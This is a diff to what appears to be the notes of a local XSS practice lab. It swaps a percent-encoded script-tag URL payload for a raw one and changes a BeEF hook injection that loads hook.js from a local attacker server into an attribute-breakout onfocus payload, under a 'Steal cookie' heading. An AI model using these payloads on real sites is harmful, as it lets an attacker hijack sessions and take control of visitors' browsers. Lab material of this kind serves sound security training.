@@ -63,7 +63,7 @@ javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembe
 
 * Open http://localhost:3000/#message (A script inserts this URL fragment in the page)
 
-* Open http://localhost:3000/#%3Cscript%3Ealert(%22XSS%22);%3C/script%3E
+* Open http://localhost:3000/#<script>alert("XSS");</script>
 
 
 ### Steal cookie
@@ -89,5 +89,5 @@ Redirection will be suspicious! Try without redirecting on another page.
 Payload to hook the page with BeEF:
 
 ```javascript
-<img src=1 href=1 onerror="javascript: (function () { var url = 'http://127.0.0.1:4000/hook.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();"></img>
+" autofocus onfocus="javascript: (function () { var url = 'http://127.0.0.1:4000/hook.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();
 ```
